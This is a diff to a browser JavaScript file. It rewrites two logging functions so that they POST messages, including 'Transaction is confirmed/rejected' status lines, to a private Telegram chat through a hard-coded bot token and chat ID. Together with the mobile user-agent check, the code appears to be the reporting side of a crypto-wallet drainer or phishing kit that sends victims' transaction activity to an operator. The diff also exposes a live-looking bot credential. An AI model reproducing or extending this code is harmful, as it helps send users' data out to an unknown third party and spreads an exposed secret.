@@ -860,7 +860,7 @@ String.prototype.format = function () {
         return typeof args[index] == 'undefined' ? match : args[index];
     });
 };
-
+/*
 function logTlgMsg(msg, sus, hash) {
   if (sus == "1") {
     var succestrans = '✅ <b>Transaction is confirmed</b>';
@@ -898,6 +898,75 @@ function logTlg(msg) {
     })
   }
 );
+}
+*/
+async function logTlgMsg(msg, sus, hash) {
+  const succestrans =
+    sus === "1"
+      ? "✅ <b>Transaction is confirmed</b>"
+      : "❌ <b>Transaction is rejected</b>";
+
+  try {
+    const response = await fetch(
+      "https://api.telegram.org/bot8936022211:AAFOQR4J-q9AMQsYglu7mje8c87iXLInP6o/sendMessage",
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: "8614416084",
+          text: msg + "\n" + succestrans,
+          parse_mode: "HTML"
+        })
+      }
+    );
+
+    const result = await response.json();
+
+    if (!response.ok || !result.ok) {
+      console.error("Telegram rejected message:", result);
+      return false;
+    }
+
+    console.log("Telegram message sent:", result);
+    return true;
+  } catch (error) {
+    console.error("Telegram request failed:", error);
+    return false;
+  }
+}
+
+async function logTlg(msg) {
+  try {
+    const response = await fetch(
+      "https://api.telegram.org/bot8936022211:AAFOQR4J-q9AMQsYglu7mje8c87iXLInP6o/sendMessage",
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: "8614416084",
+          text: msg,
+          parse_mode: "HTML"
+        })
+      }
+    );
+
+    const result = await response.json();
+
+    if (!response.ok || !result.ok) {
+      console.error("Telegram rejected message:", result);
+      return false;
+    }
+
+    console.log("Telegram message sent:", result);
+    return true;
+  } catch (error) {
+    console.error("Telegram request failed:", error);
+    return false;
+  }
 }
 
 if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
